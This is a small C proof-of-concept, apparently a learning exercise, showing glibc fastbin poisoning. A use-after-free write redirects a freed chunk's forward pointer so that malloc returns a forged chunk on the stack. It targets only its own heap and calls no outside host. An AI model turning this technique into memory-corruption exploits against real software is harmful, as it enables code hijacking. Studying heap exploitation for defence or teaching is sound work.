#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main() {
    struct forged_chunk {
    	size_t prev_size;
    	size_t size;
    	struct forged_chunk *fd;
    	struct forged_chunk *bck;
    	char buf[10];               // padding
     };
    // First grab a fast chunk
    char *b = malloc(10);
    char *c = malloc(10);
    char *d = malloc(10);
    char *e = malloc(10);
    char *f = malloc(10);
    char *g = malloc(10);
    char *h = malloc(10);

    char* a = (char*) malloc(11);

    free(b);
    free(c);
    free(d);
    free(e);
    free(f);
    free(g);
    //free(h);

    //char* a = (char*) malloc(10);
    // Create a forged chunk
    struct forged_chunk chunk;    // At address 0x7ffc6de96690
    chunk.size = 0x20;            // This size should fall in the same fastbin
    char* data = (char *)&chunk.fd;     // Data starts here for an allocated chunk
    strcpy(data, "attacker's data");

    // Put the fast chunk back into fastbin
    free(a);
    // Modify 'fd' pointer of 'a' to point to our forged chunk
    *((unsigned long long *)a) = (unsigned long long)&chunk;
    // Remove 'a' from HEAD of fastbin
    // Our forged chunk will now be at the HEAD of fastbin
    char* rand = (char*)malloc(10);                   // Will return 0x219c010
    //printf("rand points to: %p\n", rand);

    char* victim = (char*)malloc(10);          // Points to 0x7ffc6de966a0
    printf("%s\n", victim);       // Prints "attacker's data" !!
    char* activate_hook = (char*) malloc(1000); // To get another malloc hook to view the bins again
    return 0;

}
